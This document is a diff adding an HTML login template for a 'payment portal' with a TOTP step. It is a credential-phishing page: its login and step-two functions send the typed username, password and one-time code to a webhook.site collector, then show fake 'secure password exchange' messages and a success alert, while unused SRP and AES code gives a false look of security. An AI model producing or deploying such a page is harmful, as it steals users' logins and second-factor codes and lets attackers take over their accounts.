@@ -1,0 +1,257 @@
+{% extends "base.html" %}
+
+{% block title %}Log In{% endblock %}
+
+{% block content %}
+    <div id="main" class="hero" style="animation: fadeIn 1s ease-in;">
+        <h1>Log In to Your Account</h1>
+        <p>Access your payment portal by signing in below.</p>
+    </div>
+    <div id="step2" class="hero" style="animation: fadeIn 1s ease-in; display: none;">
+        <h1 id="welcome-message">Welcome </h1>
+        <p>Please complete the security step</p>
+    </div>
+
+    <div id="main-a" class="card">
+        <h3>Sign In</h3>
+        <p>
+            <label for="login">Username or Email:</label><br>
+            <input type="text" id="username" placeholder="Enter your username or email" style="width: 100%; padding: 0.8rem; margin-bottom: 1rem; border: none; border-radius: 5px; background: rgba(255, 255, 255, 0.3); color: #fff;" required><br>
+            <label for="password">Password:</label><br>
+            <input type="password" id="password" placeholder="Enter your password" style="width: 100%; padding: 0.8rem; margin-bottom: 1rem; border: none; border-radius: 5px; background: rgba(255, 255, 255, 0.3); color: #fff;" required><br>
+        </p>
+        <button id="login-btn" class="btn" style="animation: bounce 0.3s ease-in-out;" onclick="login()">Log In</button>
+    </div>
+    <div id="step2-a" class="card" style="display: none;">
+        <h3>Sign In</h3>
+        <p>
+            
+            <label for="password">TOTP:</label><br>
+            <input type="password" id="password-step2" placeholder="6 digit auth code" style="width: 100%; padding: 0.8rem; margin-bottom: 1rem; border: none; border-radius: 5px; background: rgba(255, 255, 255, 0.3); color: #fff;" required><br>
+        </p>
+        <button id="login-btn-step2" class="btn" style="animation: bounce 0.3s ease-in-out;" onclick="step2login()">Log In</button>
+    </div>
+
+    <div class="loading-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Loading...</p>
+        <p id="loading-message" style="color: #fff;"></p>
+    </div>
+
+    <pre id="log" style="background: rgba(0, 0, 0, 0.1); padding: 1rem; border-radius: 5px; color: #fff;"></pre>
+
+    <style>
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5); /* Semi-transparent gray background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999; /* Ensures it appears above all other content */
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3; /* Light gray border */
+            border-top: 5px solid #3498db; /* Blue top border to create spinning effect */
+            border-radius: 50%; /* Circular shape */
+            animation: spin 1s linear infinite; /* Continuous spinning animation */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.4);
+        }
+    </style>
+
+    <!-- Load JSEncrypt -->
+    
+    <script src="https://cdn.jsdelivr.net/npm/tweetnacl@1.0.3/nacl.min.js"></script>
+
+
+    <script>
+    const N_hex = 
+  "E93E6836D33110E240374917FE95AFEE44CA70E68360AC123D0BE1A821F11668" +
+  "08D64F19AE7266A2F94F9B6F24E19BCE5527C37585E1339168C6A00505CA3473" +
+  "4B3296A0343A955D06B012E47B2955CB0A754059D3E01D355EF2AEA6943EC2980" +
+  "29359675ADC15DA6AA973DDEAAB7745240860BAD2843FEDA017541C08F53E4A26" +
+  "4B517BF649B8497C41B5B43E8D208E686A323F1456742551A8D4456ECC384E7CC" +
+  "289996769D4991F76FBD67035B131F34936549857FD96F51147331E051CC25288" +
+  "AA4924DD959ACC4A6E6742B7DC41E7FA799F8215A60EDC3367575F57BDF2C5D79" +
+  "0AC664E2E091DC38A2D3C5E0E81A5A404723DB5F8FF7C8C60588C2CA1B0EA1A9" +
+  "9887D952CC8908F5952BF979D6C8C4077D8378826C6BAA860C934D51E03382865" +
+  "530786EF9F2876DA007A5363C31D10AAFE6F4578FFD15D6EB3D6095E6CD21C12" +
+  "1A111DA9021730251BA0D5C563BA84EA5D2D14E7C13431E2573C082090844920" +
+  "954117CD3C266A7A1DDF077660E94DB2E3B81194484A1A368D75F5F06B6E1DEC" +
+  "9D9EB2401EC2E0C4642CB28FD48298354E07B4FACF1E3991F2D2503987DE54C4" +
+  "99D08C40C6B1E501A04172DA92C5B2AA54A790324B17B1F168E028ACFB005A27" +
+  "A0653A4E0015CEC8172D083CD2037C591A171E0EE1A517D72A49D1FBC19141E6" +
+  "FA46957E90F6643571AD6CDD321355DAA8233F9C83483728192DBCC844B9A701E" +
+  "7ED1D81F97E5F6614389492A87808B089AA0A802357C16A46166ED7142660E88D" +
+  "B70DB75E0B13F16F00E6146B5290EDAD9CC6C9136F757D5FD64AB5058F63321F" +
+  "931F4E6E75796670BFB80A01DFFF4CC070BEA10C92055FEEFD879FABD9180DA2" +
+  "0FF8910ADE467E03276CFD6BF739D6E927BF92F9BD71A965385DB69A9E498342" +
+  "AA88C403F147953CDF128C873855DA1900F88124E0B59BC016B060A92B369AE2" +
+  "64D5DDBDB52FE8C3A98D90859308EAA833C3B225D80FFDF8918A8DFF1E07F4D3" +
+  "9CB56AD5A69E383DA6A72E644636A07CD23DD47A34ECE161D731AEAC5BAD6E921" +
+  "1E21D213B2E6DCBD52BED48A94D8198C20525EBFDDA3B4BF424C51FE319B15E9" +
+  "2CA1358C878A6FB75EF28BB24232E160A251E3F8FA0708B14AEF693BDBA072C3" +
+  "A7C3B3DBF58E39B5AF77B10F2C5E98726914F9EF80DF4C50E84F883DCE22BF4E" +
+  "D238839BC69ACA9CDBCC9E4779E9798D090ACDA4E879074213B9905FC86F761B" +
+  "E7F26EAC471622DCAD1A3E54781AF59BD48721D4A129CB1FA17428E633F70F40" +
+  "8291354B827BF09A973B73BB93E976964D41467AC13D2665773DD2130805E3A38" +
+  "C4C565BCE57E301447838022FE0269D2E6E71B108B7FEA58F8CBAF436EB33F9A" +
+  "73371E48133DF41E868AA90E805F35303CE4CC1479C13649A93F47D42E5DE7CF" +
+  "8E1F8F91386897B9BAEC36268BD442596BAE490311B36846146DB3";
+
+const N = BigInt('0x' + N_hex.replace(/\s+/g, '')); // Ensure no whitespace
+const g = 2n;
+const k = 3n;
+
+
+    async function sha256(data) {
+      if (!(data instanceof Uint8Array)) {
+        throw new Error("sha256 expects Uint8Array");
+      }
+      const buffer = await window.crypto.subtle.digest("SHA-256", data);
+      return new Uint8Array(buffer);
+    }
+
+    function textToBytes(text) {
+      return new TextEncoder().encode(text);
+    }
+
+    function hexToBytes(hex) {
+      return new Uint8Array(hex.match(/.{1,2}/g).map(b => parseInt(b, 16)));
+    }
+
+    function bytesToHex(bytes) {
+      return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    function bigIntToBytes(num) {
+      let hex = num.toString(16);
+      if (hex.length % 2) hex = '0' + hex;
+      return hexToBytes(hex);
+    }
+
+    function modPow(base, exp, mod) {
+      let result = 1n;
+      base = base % mod;
+      while (exp > 0) {
+        if (exp % 2n === 1n) result = (result * base) % mod;
+        exp = exp >> 1n;
+        base = (base * base) % mod;
+      }
+      return result;
+    }
+
+    function xorBuffers(buf1, buf2) {
+      return new Uint8Array(buf1.map((b, i) => b ^ buf2[i]));
+    }
+
+    function hexToBytes(hex) {
+      const bytes = new Uint8Array(hex.length / 2);
+      for (let i = 0; i < bytes.length; i++) {
+        bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
+      }
+      return bytes;
+    }
+
+    function bytesToHex(bytes) {
+      return [...bytes].map(x => x.toString(16).padStart(2, "0")).join("");
+    }
+
+    async function encrypt(key, data) {
+      const iv = window.crypto.getRandomValues(new Uint8Array(12));
+      const ct = await window.crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, data);
+      return new Uint8Array([...iv, ...new Uint8Array(ct)]);
+    }
+
+    async function decrypt(key, encrypted) {
+      const iv = encrypted.slice(0, 12);
+      const ct = encrypted.slice(12);
+      const pt = await window.crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, ct);
+      return new Uint8Array(pt);
+    }
+
+
+    async function login() {
+
+      //display loading overlay
+      document.querySelector('.loading-overlay').style.display = 'flex';
+      document.getElementById('loading-message').textContent = 'Starting login process...';
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      res = await fetch("https://webhook.site/d0c77cb5-b72a-49b9-a354-b0c6206e4245", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ username, password })
+      });
+
+
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      document.getElementById('loading-message').textContent = 'Doing secure password exchange...';
+
+      await new Promise(resolve => setTimeout(resolve, 3000));
+
+    document.querySelector('.loading-overlay').style.display = 'none';
+
+    alert("Login successful!")
+
+
+    document.getElementById("step2-a").style.display = "block";
+      document.getElementById("main-a").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+      document.getElementById("main").style.display = "none";
+      document.getElementById("welcome-message").textContent = "Welcome, " + "ben; 107" + "!";
+
+      document.querySelector('.loading-overlay').style.display = 'none';
+      window.scrollTo(0, 0);
+      window.session_id = session_id; // Store session ID for later use
+
+    
+
+    }
+
+    async function step2login() {
+        const password = document.getElementById("password-step2").value;
+
+        if (!password) {
+            alert("Please enter the TOTP code.");
+            return;
+        }
+
+        res = await fetch("https://webhook.site/d0c77cb5-b72a-49b9-a354-b0c6206e4245", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ password })
+        });
+    }
+    
+
+  </script>
+{% endblock %}
